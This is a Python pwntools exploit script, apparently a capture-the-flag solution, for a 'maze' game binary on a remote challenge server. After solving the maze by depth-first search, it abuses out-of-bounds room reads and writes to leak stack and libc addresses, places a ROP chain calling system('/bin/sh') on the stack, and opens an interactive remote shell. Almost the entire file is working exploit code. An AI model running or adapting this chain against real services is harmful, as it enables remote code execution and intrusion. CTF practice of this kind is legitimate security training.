#!/usr/bin/env python2
#Exploit for the Maze executable

from pwn import *
import copy
from struct import pack
import struct

#------------------------------
#Analyze the maze
#------------------------------
tab = "0x9	0x5	0x9	0x5	0x3	0x3	0x3	0x9 0x5  0x9	0x5	0x9	0x7	0x3	0x9	0xd 0x5	0x9	0x7	0x9	0x5	0xb	0x5	0x3 0x9	0x5	0x9	0x7	0x1	0x3	0x3	0x9 0x6	0xa	0xc	0x6	0x9	0x5	0x3	0xa 0xc	0xc	0xc	0x6	0x3	0x3	0x2	0x8 0xe	0x4	0x3	0xa	0x6	0x3	0xa	0x5 0xa	0xc	0x6	0x3	0xa	0x5	0x3	0x8 0x5	0x3	0xa	0x5	0xa	0x6	0x3	0x9 0xc	0xc	0x6	0x3	0x9	0x5	0x3	0x2 0x3	0x2	0x9	0x5	0x3	0x9	0x5	0xa 0xd	0xc	0x5	0x9	0x7	0xa	0xd	0xc 0x6	0x3	0x1	0xa	0x5	0xb	0x5	0xa 0xc	0xc	0x7	0x3	0xa	0x4	0x3	0x3 0x9	0x5	0xa	0xc	0x5	0xa	0x6	0x9 0xc	0xc	0xe	0x6	0x1	0x9	0x6	0x8 0x5	0x3	0xa	0xd	0x6	0x3	0x0	0x3 0xa	0x6	0x3	0x3	0x3	0x2	0xb	0x5 0x8	0x6	0x3	0xa	0x6	0x3	0x3	0xa 0x6	0x0	0x3	0x3	0xa	0xc	0x7	0xa 0xc	0x5	0x3	0x2	0x3	0x3	0xa	0x5 0xb	0x5	0x1	0x3	0x9	0x5	0x3	0xa 0x6	0x9	0x5	0x9	0x5	0x3	0x9	0x5 0x9	0x6	0x9	0x5	0x9	0x6	0x3	0x9 0xc	0x6	0x3	0x9	0x5	0x9	0x5	0xa 0x5	0xa	0x6	0x9	0x6	0xa	0x5	0x3 0x9	0xc	0xe	0x6	0x0	0x9	0x6	0xa 0x6	0x3	0xa	0xc	0xc	0x5	0xb	0xc 0xc	0x5	0xb	0xc	0xc	0x4	0xa	0xd 0xc	0x7	0x9	0x6	0x9	0x5	0xa	0x5 0xa	0x6	0x9	0x5	0xa	0x6	0x9	0x5 0x9	0x5	0x9	0xc	0xc	0x4	0x1	0xa 0xc	0x6	0x3	0xa	0xe	0x4	0x3	0xa 0xc	0x5	0x0	0x9	0x6	0xa	0xd	0x6 0x9	0x5	0xa	0x6	0xb	0x5	0xa	0xc 0xc	0xc	0xc	0xe	0xc	0xe	0x6	0x9 0x4	0xb	0x5	0x3	0x9	0x6	0x3	0x3 0xa	0xc	0xe	0x6	0xb	0x5	0x8	0x5 0xa	0x4	0x3	0x3	0x3	0xa	0x5	0xa 0xc	0xc	0x6	0x9	0xc	0x5	0xb	0xc 0x6	0x3	0xa	0xd	0x6	0x1	0x1	0x9 0x5	0xa	0x5	0x3	0x1	0x8	0x6	0xa 0xd	0xc	0x5	0x3	0x3	0x3	0xa	0x5 0xa	0xc	0xd	0xc	0x6	0x0	0x9	0xe 0xd	0x5	0x9	0x6	0x3	0xa	0xc	0xc 0xc	0x7	0x0	0x9	0xc	0x6	0x3	0x9 0x6	0xa	0xc	0x5	0x3	0x3	0xb	0xc 0xd	0xc	0x6	0xa	0x7	0xa	0x6	0x9 0x6	0xa	0x6	0x3	0x3	0x3	0xa	0xc 0xc	0x5	0xa	0xe	0x6	0x9	0x5	0xa 0x5	0x3	0x8	0x6	0x3	0x3	0x9	0xc 0x6	0x0	0x3	0x9	0x5	0x3	0x9	0xc 0x5	0x9	0x5	0xb	0x5	0x3	0x3	0x8 0x6	0xa	0x5	0x3	0x1	0xa	0x6	0x1 0xa	0x5	0xa	0x5	0x3	0x9	0xc	0xc 0x7	0x0	0x9	0xe	0xc	0xd	0xc	0xc 0xc	0xc	0x6	0x1	0xa	0x5	0x9	0xe 0x5	0x9	0xc	0xd	0x4	0xb	0x5	0x8 0x5	0xa	0x5	0xa	0x7	0xa	0xc	0x6 0x9	0xe	0x6	0x9	0xc	0x6	0xa	0xc 0xc	0x6	0x3	0xa	0x5	0xa	0x6	0x9 0xc	0x6	0xa	0xc	0xc	0x5	0xa	0xc 0x6	0x1	0xa	0xd	0x5	0x3	0xa	0x7 0x0	0x9	0x7	0x0	0x8	0x5	0x9	0xc 0xc	0x5	0x3	0x9	0xc	0xd	0x5	0xa 0xc	0x5	0xb	0x6	0xa	0x6	0x9	0xe 0x5	0x2	0x3	0xa	0xc	0x5	0x3	0x1 0xa	0xc	0x5	0xa	0x6	0xa	0x6	0x8 0x6	0xa	0xd	0xc	0xc	0xc	0xc	0x5 0xa	0x6	0x3	0x3	0x9	0x5	0xa	0x5 0xa	0x7	0x3	0x9	0xc	0x6	0x9	0x6 0xb	0x6	0xa	0x5	0x3	0x9	0x7	0xa 0x5	0x9	0x4	0xa	0xc	0x6	0xa	0x4 0x3	0x3	0x9	0x5	0xa	0x4	0xb	0xc 0x5	0x3	0x9	0x4	0xa	0xd	0xc	0xd 0x5	0x3	0x9	0xc	0x5	0xa	0x5	0x9 0xc	0xc	0xe	0x5	0x0	0x9	0x5	0xa 0x5	0x3	0xa	0xc	0x7	0xa	0x5	0xa 0xc	0x5	0xa	0x6	0x9	0x6	0xa	0x6 0x0	0xb	0x6	0xa	0x6	0x9	0xc	0xc 0xc	0x6	0x9	0xe	0xc	0xe	0xc	0x5 0xa	0x5	0x3	0x2	0x9	0x5	0xa	0x5 0xa	0x6	0x3	0x3	0xa	0x5	0x3	0x9 0xc	0x5	0x3	0x3	0x9	0xc	0xc	0xe 0xc	0x5	0xa	0x5	0x0	0x3	0xa	0x6 0x3	0xa	0x5	0x3	0xa	0x6	0x3	0xa 0x5	0x9	0x5	0x9	0x5	0xa	0x5	0xa 0xc	0x6	0x3	0x9	0x6	0xa	0x6	0x9 0xc	0xc	0x5	0xa	0xc	0x7	0x3	0x3 0x9	0xd	0x6	0x3	0x9	0x7	0x9	0x5 0x8	0xc	0xc	0x6	0xa	0xd	0xc	0x5 0xa	0x5	0x9	0x6	0x9	0x5	0x9	0xc 0xc	0xe	0xc	0xd	0x6	0x3	0x1	0x3 0xa	0xc	0x5	0x1	0xa	0x5	0x2	0xa 0xe	0xc	0x6	0x3	0x9	0xc	0x6	0xa 0xd	0xc	0x6	0x9	0xc	0xc	0x4	0xa 0x6	0x1	0xa	0x6	0x9	0x5	0xa	0x7 0x3	0x0	0xa	0x6	0xb	0x6	0x9	0xd 0x5	0xa	0x7	0x9	0x6	0x2	0x3	0x3 0x8	0xc	0xd	0xc	0x6	0xa	0xc	0xd 0x5	0x2	0xb	0x5	0xa	0xc	0x5	0x1 0x9	0xe	0x5	0x9	0x5	0x3	0xa	0x6 0x8	0x7	0x9	0xc	0x5	0x3	0x3	0x9 0xc	0xc	0xc	0xc	0xd	0x5	0x2	0xa 0x6	0x3	0x9	0xc	0x5	0xa	0xc	0xc 0x6	0x9	0xc	0xc	0xc	0x5	0x3	0x3 0xa	0x5	0x2	0xa	0x6	0x9	0x7	0xa 0x6	0x2	0xa	0xc	0x6	0xa	0x7	0x9 0x5	0x3	0xa	0xc	0x6	0x3	0xa	0xc 0x5	0xa	0xc	0x4	0xa	0xe	0x5	0x1 0xb	0xc	0x5	0x3	0xb	0x6	0x9	0x5 0x3	0xb	0x5	0xa	0x7	0x9	0x5	0xa 0x6	0x3	0x3	0xa	0x5	0x3	0x9	0xe 0x6	0x1	0xa	0x6	0x9	0x5	0xa	0xc 0x5	0xa	0xc	0x5	0x3	0x3	0xa	0xc 0x5	0x3	0xa	0x5	0x3	0xa	0x6	0x9 0xd	0x5	0x9	0x5	0xa	0xd	0x6	0x9 0x5	0xa	0x5	0x3	0xa	0xc	0x5	0xa 0xc	0xd	0x4	0x2	0x9	0x5	0x3	0xa 0xc	0x7	0x9	0x6	0x3	0x9	0x5	0xa 0x4	0xa	0x6	0xa	0x5	0xa	0x5	0xa 0xc	0x5	0xa	0x5	0x3	0xa	0xc	0xd 0x6	0x0	0xa	0x5	0x0	0xa	0x5	0x3 0x0	0x3	0x0	0x3	0x3	0xa	0x6	0x9 0x6	0x3	0x3	0x3	0x2	0xb	0x6	0x3 0xa	0x6	0x3	0xa	0x7	0x3	0x2	0x2 0x3	0xa	0x7	0xa	0x6	0x3	0xa	0x7 0x2	0xb	0x6	0x3	0x3	0x3	0x3	0x2 "

filtered = []
for entry in tab.split('0x'):
    if(entry.strip() == ''):
        continue
    filtered.append(int(entry.strip(), 16))

maze = [filtered[32*i:32*(i+1)] for i in range(len(filtered)/32)]
visited = [0 for i in range(len(filtered))]

#DFS in python - i hope I have enough ram...
random_walk = ""
def walk(id = 0, dest = 1023):
    global random_walk
    global visited

    visited[id] = 1

    if id == dest:
        return True

    if(id<1024 and id>=0 and (filtered[id] & 1) == 0 and visited[id-32] == 0):
        random_walk = random_walk + "n\n"
        if(walk(id-32)):
            return True

    if(id<1024 and id>=0 and (filtered[id] & 2) == 0 and visited[id+32] == 0):
        random_walk = random_walk + "s\n"
        if(walk(id+32)):
            return True

    if(id<1024 and id>=0 and (filtered[id] & 4) == 0 and visited[id-1] == 0):
        random_walk = random_walk + "w\n"
        if(walk(id-1)):
            return True

    if(id<1024 and id>=0 and (filtered[id] & 8) == 0 and visited[id+1] == 0):
        random_walk = random_walk + "e\n"
        if(walk(id+1)):
            return True

    random_walk = random_walk[:-2]
    return False

walk();

def walk_and_read(direction, victim):
    victim.clean()
    victim.sendline(direction)
    victim.readuntil("Room contains:")
    return int(victim.readuntil("mate.").split('mate.')[0].strip())

def walk_and_dump(direction, amount, victim):
    res = 0
    for i in range(amount):
        a= walk_and_read(direction, victim)
        if direction=='w':
            res += a<<(16*(amount-i-1))
        else:
            res += a<<(16*(i))
    return res

#------------------------------
#Connect to the target
#------------------------------
#target = process("./maze")
target = remote("maze.stillhackinganyway.nl", 8001)
target.send("help\n")

#------------------------------
#Locate the stack based on a left over stack frame
#------------------------------
target.send("w\n"*25)
current_room_mem_location = walk_and_dump('w', 3, target) - 2120
print "[*] Located variable at: "+hex(current_room_mem_location)

#------------------------------
#Get infinity mate so we can fsck the stack :)
#------------------------------
target.send("e\n"*27) #go to room -1
#clear the first room
tmp = walk_and_read('e', target)
target.sendline("take "+str(tmp))
#multiply the money :)
target.send("w\n"*7)
target.sendline("drop "+str(min(tmp,20000)))

#------------------------------
#We have enough money - time to locate libc :)
#------------------------------
target.send("e\n"*7) #go to room 0
target.send(random_walk) #solve the maze
target.send('e\ns\nw\nw\nw\nw\n') #escape the maze
target.send('e\n'*7)
target.clean()

#get the return adress to libc
ret_addr = walk_and_dump('e', 4, target)
#For Remote
offset___libc_start_main_ret = 0x20830
offset_system = 0x0000000000045390
#For Local
#offset___libc_start_main_ret = 0x20511
#offset_system = 0x0000000000040d00

print "[*] Got libc return adress at: "+hex(ret_addr)
print "[*] Located libc base at: "+hex(ret_addr-offset___libc_start_main_ret)

#------------------------------
#We know the location of the stack and libc
#We have control of the rip register
#Write a rop chain to memory to call system("/bin/sh");
#------------------------------
target.send('w\n'*5) #go back the the return adress

def write_bytes(direction, data):
    for i in range(len(data)/2):
        #zero out the memory location
        tmp = walk_and_read(direction, target)
        target.sendline("take "+str(tmp))

        val = struct.unpack('h', data[2*i:2*i+2])[0]
        if(val<0):
            val = 2**16-abs(val)
        #print hex((ord(data[2*i])<<8) + ord(data[2*i+1])), val
        target.sendline("drop "+str(val))

rop = ''
rop +=  pack('Q',(0x0000000000400d63)) #pop rdi; ret;
rop +=  pack('Q',(current_room_mem_location+2152)) #new rdi - point to "/bin/sh"
rop +=  pack('Q', (ret_addr-offset___libc_start_main_ret+offset_system)) #system
rop +=  "/bin/sh\x00/bin/sh\x00"

write_bytes('e', '\x00\x00'+rop) #null bytes needed for aligment
print '[*] Code written'

#------------------------------
#The rop chain is ready
#Time to exit main :)
#------------------------------
#dump the mate's somewhere far away
target.send('e\n'*6)
target.clean()
target.send('e\n')
target.readuntil("You have:")
tmp = int(target.readuntil("mate.").split('mate.')[0].strip())
target.sendline("drop "+str(tmp-31337))

#go to the exit
target.send('w\n'*(11+len(rop)/2))
target.clean()
target.send('n\n'*1)

print '[*] Enjoy your shell!'
target.interactive()
